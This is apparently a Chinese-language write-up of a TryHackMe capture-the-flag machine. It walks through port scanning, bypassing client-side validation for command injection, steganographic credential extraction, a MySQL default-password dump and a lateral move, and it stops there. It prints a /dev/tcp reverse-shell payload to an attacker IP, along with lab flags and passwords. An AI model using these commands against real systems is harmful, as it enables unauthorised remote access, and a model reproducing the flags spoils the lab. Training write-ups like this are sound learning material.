# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# nmap -sV -Pn 10.10.146.186    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 03:09 EST
Nmap scan report for 10.10.146.186
Host is up (0.30s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
9999/tcp open  abyss?
```

快速扫描，连个web服务都没有，却有mysql服务，怀疑在高端口存在http，全端口扫描一下：
```
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# nmap -sV -Pn 10.10.146.186 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 03:11 EST
Stats: 0:14:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 66.78% done; ETC: 03:34 (0:07:26 remaining)
Stats: 0:22:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 03:34 (0:00:32 remaining)
Nmap scan report for 10.10.146.186
Host is up (0.30s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3306/tcp  open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
9999/tcp  open  abyss?
15065/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
16109/tcp open  unknown
46969/tcp open  telnet  Linux telnetd
```

果然在15065端口存在一个golang的http服务，打开页面只显示两行文字：
> Site down for maintenance
> Blame Dan, he keeps messing with the prod servers.

现在我们知道有一个用户名叫做:```Dan```

用dan做用户名，爆破ssh和telnet，无果。

## 爆破15065目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.146.186:15065/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.146.186-15065/-_21-11-09_03-48-30.txt

Error Log: /root/dirsearch/logs/errors-21-11-09_03-48-30.log

Target: http://10.10.146.186:15065/

[03:48:31] Starting: 
               
[03:49:59] 200 -    1KB - /monitor/                                         
[03:49:59] 301 -    0B  - /monitor  ->  monitor/                            

```

打开monitor，显示一个ping命令行的页面，只能输入ip，尝试命令行注入,无果。

检查网页源代码，发现```main.js```里有这段代码
```
//Steve said I should obfuscate my code to make it better. I don't really understand but it works so meh

const _0x1a9d=['dmFsdWU=','I2hvc3RUb1Bpbmc=','dGVzdA==','SVAgYWRkcmVzcyBpbnZhbGlk','cXVlcnlTZWxlY3Rvcg==','UGluZ2luZzog','dGV4dENvbnRlbnQ='];(function(_0x365cb9,_0x1a9de5){const _0x4d6713=function(_0x1784af){while(--_0x1784af){_0x365cb9['push'](_0x365cb9['shift']());}};_0x4d6713(++_0x1a9de5);}(_0x1a9d,0x148));const _0x4d67=function(_0x365cb9,_0x1a9de5){_0x365cb9=_0x365cb9-0x0;let _0x4d6713=_0x1a9d[_0x365cb9];if(_0x4d67['NLdOOO']===undefined){(function(){let _0x525fb1;try{const _0x3f1d56=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x525fb1=_0x3f1d56();}catch(_0xc71f1){_0x525fb1=window;}const _0x4685a7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x525fb1['atob']||(_0x525fb1['atob']=function(_0x255321){const _0x24c30f=String(_0x255321)['replace'](/=+$/,'');let _0x5e1a31='';for(let _0x4d6263=0x0,_0x55cd30,_0x4f9f3e,_0x1e913f=0x0;_0x4f9f3e=_0x24c30f['charAt'](_0x1e913f++);~_0x4f9f3e&&(_0x55cd30=_0x4d6263%0x4?_0x55cd30*0x40+_0x4f9f3e:_0x4f9f3e,_0x4d6263++%0x4)?_0x5e1a31+=String['fromCharCode'](0xff&_0x55cd30>>(-0x2*_0x4d6263&0x6)):0x0){_0x4f9f3e=_0x4685a7['indexOf'](_0x4f9f3e);}return _0x5e1a31;});}());_0x4d67['LCDJpm']=function(_0x16dbab){const _0x48165c=atob(_0x16dbab);let _0x25c165=[];for(let _0x2e78af=0x0,_0x1185f3=_0x48165c['length'];_0x2e78af<_0x1185f3;_0x2e78af++){_0x25c165+='%'+('00'+_0x48165c['charCodeAt'](_0x2e78af)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25c165);};_0x4d67['znaolL']={};_0x4d67['NLdOOO']=!![];}const _0x1784af=_0x4d67['znaolL'][_0x365cb9];if(_0x1784af===undefined){_0x4d6713=_0x4d67['LCDJpm'](_0x4d6713);_0x4d67['znaolL'][_0x365cb9]=_0x4d6713;}else{_0x4d6713=_0x1784af;}return _0x4d6713;};async function pingHost(){const _0x25c165=document[_0x4d67('0x5')]('#outputSection');const _0x2e78af=document[_0x4d67('0x5')](_0x4d67('0x2'));const _0x1185f3=_0x2e78af[_0x4d67('0x1')];if(_0x1185f3!==undefined&&_0x1185f3!==''&&ValidateIPaddress(_0x1185f3)){_0x25c165[_0x4d67('0x0')]=_0x4d67('0x6')+_0x1185f3+'\x0a';const _0x27c227=await postData('/api/cmd','ping\x20-c\x204\x20'+_0x1185f3);_0x25c165['textContent']+=await _0x27c227['text']();}else{_0x25c165[_0x4d67('0x0')]=_0x4d67('0x4');}}function ValidateIPaddress(_0x23b8a0){if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d67('0x3')](_0x23b8a0)){return!![];}return![];}
```

格式化这段js代码：
```
const _0x1a9d = ['dmFsdWU=', 'I2hvc3RUb1Bpbmc=', 'dGVzdA==', 'SVAgYWRkcmVzcyBpbnZhbGlk', 'cXVlcnlTZWxlY3Rvcg==', 'UGluZ2luZzog', 'dGV4dENvbnRlbnQ=']; (function(_0x365cb9, _0x1a9de5) {
    const _0x4d6713 = function(_0x1784af) {
        while (--_0x1784af) {
            _0x365cb9['push'](_0x365cb9['shift']());
        }
    };
    _0x4d6713(++_0x1a9de5);
} (_0x1a9d, 0x148));
const _0x4d67 = function(_0x365cb9, _0x1a9de5) {
    _0x365cb9 = _0x365cb9 - 0x0;
    let _0x4d6713 = _0x1a9d[_0x365cb9];
    if (_0x4d67['NLdOOO'] === undefined) { (function() {
            let _0x525fb1;
            try {
                const _0x3f1d56 = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
                _0x525fb1 = _0x3f1d56();
            } catch(_0xc71f1) {
                _0x525fb1 = window;
            }
            const _0x4685a7 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            _0x525fb1['atob'] || (_0x525fb1['atob'] = function(_0x255321) {
                const _0x24c30f = String(_0x255321)['replace'](/=+$/, '');
                let _0x5e1a31 = '';
                for (let _0x4d6263 = 0x0, _0x55cd30, _0x4f9f3e, _0x1e913f = 0x0; _0x4f9f3e = _0x24c30f['charAt'](_0x1e913f++);~_0x4f9f3e && (_0x55cd30 = _0x4d6263 % 0x4 ? _0x55cd30 * 0x40 + _0x4f9f3e: _0x4f9f3e, _0x4d6263++%0x4) ? _0x5e1a31 += String['fromCharCode'](0xff & _0x55cd30 >> ( - 0x2 * _0x4d6263 & 0x6)) : 0x0) {
                    _0x4f9f3e = _0x4685a7['indexOf'](_0x4f9f3e);
                }
                return _0x5e1a31;
            });
        } ());
        _0x4d67['LCDJpm'] = function(_0x16dbab) {
            const _0x48165c = atob(_0x16dbab);
            let _0x25c165 = [];
            for (let _0x2e78af = 0x0, _0x1185f3 = _0x48165c['length']; _0x2e78af < _0x1185f3; _0x2e78af++) {
                _0x25c165 += '%' + ('00' + _0x48165c['charCodeAt'](_0x2e78af)['toString'](0x10))['slice']( - 0x2);
            }
            return decodeURIComponent(_0x25c165);
        };
        _0x4d67['znaolL'] = {};
        _0x4d67['NLdOOO'] = !![];
    }
    const _0x1784af = _0x4d67['znaolL'][_0x365cb9];
    if (_0x1784af === undefined) {
        _0x4d6713 = _0x4d67['LCDJpm'](_0x4d6713);
        _0x4d67['znaolL'][_0x365cb9] = _0x4d6713;
    } else {
        _0x4d6713 = _0x1784af;
    }
    return _0x4d6713;
};
async
function pingHost() {
    const _0x25c165 = document[_0x4d67('0x5')]('#outputSection');
    const _0x2e78af = document[_0x4d67('0x5')](_0x4d67('0x2'));
    const _0x1185f3 = _0x2e78af[_0x4d67('0x1')];
    if (_0x1185f3 !== undefined && _0x1185f3 !== '' && ValidateIPaddress(_0x1185f3)) {
        _0x25c165[_0x4d67('0x0')] = _0x4d67('0x6') + _0x1185f3 + '\x0a';
        const _0x27c227 = await postData('/api/cmd', 'ping\x20-c\x204\x20' + _0x1185f3);
        _0x25c165['textContent'] += await _0x27c227['text']();
    } else {
        _0x25c165[_0x4d67('0x0')] = _0x4d67('0x4');
    }
}
function ValidateIPaddress(_0x23b8a0) {
    if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ [_0x4d67('0x3')](_0x23b8a0)) {
        return !! [];
    }
    return ! [];
}
```

阅读js代码，发现命令行的过滤是在js端执行的，主要是ValidateIPaddress这个函数。

我们用burp抓包。直接从burp发命令，绕过浏览器的js过滤

payload：
```
POST /api/cmd HTTP/1.1

Host: 10.10.146.186:15065

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.146.186:15065

Content-Length: 8

Connection: close



ifconfig
```


返回：
```
HTTP/1.1 200 OK

Date: Tue, 09 Nov 2021 10:21:29 GMT

Content-Length: 900

Content-Type: text/plain; charset=utf-8

Connection: close



eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.146.186  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::53:b1ff:fe33:d9b3  prefixlen 64  scopeid 0x20<link>
        ether 02:53:b1:33:d9:b3  txqueuelen 1000  (Ethernet)
        RX packets 1225123  bytes 132078973 (132.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 858039  bytes 110027220 (110.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 40410  bytes 4167976 (4.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 40410  bytes 4167976 (4.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


我们用下面payload创建一个反弹shell：
```0<&196;exec 196<>/dev/tcp/10.13.21.169/4242; sh <&196 >&196 2>&196```

# 拿到初始shell
```
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# nc -lnvp 4242           
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.146.186] 46670
id
uid=1004(bread) gid=1004(bread) groups=1004(bread)
whoami
bread
ls
flag
main
main.go
resources
cat flag
cat: flag: Permission denied

```

本账号下的flag居然没有读权限。


9999端口也是一个http服务，打开页面 打印一个:```king```，不知道是干嘛。

16109端口打开浏览器显示一张图片，把图片下载到本地分析。

exiftool查看图片基本信息，binwalk查看图片组成，再用steghide命令分离出一个creds.txt文件
```
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# exiftool  10.10.146.186.jpeg 
ExifTool Version Number         : 12.16
File Name                       : 10.10.146.186.jpeg
Directory                       : .
File Size                       : 372 KiB
File Modification Date/Time     : 2021:11:09 04:02:55-05:00
File Access Date/Time           : 2021:11:09 04:04:05-05:00
File Inode Change Date/Time     : 2021:11:09 04:02:55-05:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 1350
Image Height                    : 900
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1350x900
Megapixels                      : 1.2
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# binwalk 10.10.146.186.jpeg                     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
381172        0x5D0F4         gzip compressed data, from Unix, last modified: 2020-03-19 23:53:20

                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# steghide extract -sf 10.10.146.186.jpeg 
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# cat creds.txt           
pasta:pastaisdynamic
```


尝试用creds.txt上面的凭证登录ssh，拿到一个shell

```
┌──(root💀kali)-[~/tryhackme/FoodCTF]
└─# ssh pasta@10.10.146.186                
pasta@10.10.146.186's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov  9 09:07:59 UTC 2021

  System load:  0.01              Processes:           91
  Usage of /:   43.9% of 9.78GB   Users logged in:     0
  Memory usage: 35%               IP address for eth0: 10.10.146.186
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Sat Mar 21 00:19:06 2020
pasta@foodctf:~$ id
uid=1002(pasta) gid=1002(pasta) groups=1002(pasta)
```

在```/home/bread```下拿到flag1

```
pasta@foodctf:/home/bread$ cat flag 
thm{7baf5aa8491a4b7b1c2d231a24aec575}
pasta@foodctf:/home/bread$ pwd
/home/bread

```
传linpeas枚举提权信息，发现mysql用了默认登录密码：```root:root```

登录进去。发现有一个Users数据库
```
pasta@foodctf:/tmp$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 199
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.


mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```

有一张User表
```
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| User            |

```

拿到flag2和ramen的登录凭证
```
mysql> select * from user;
ERROR 1146 (42S02): Table 'users.user' doesn't exist
mysql> select * from User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+

```

# 横向提权到ramen
```
pasta@foodctf:/tmp$ su ramen
Password: 
ramen@foodctf:/tmp$ id
uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)

```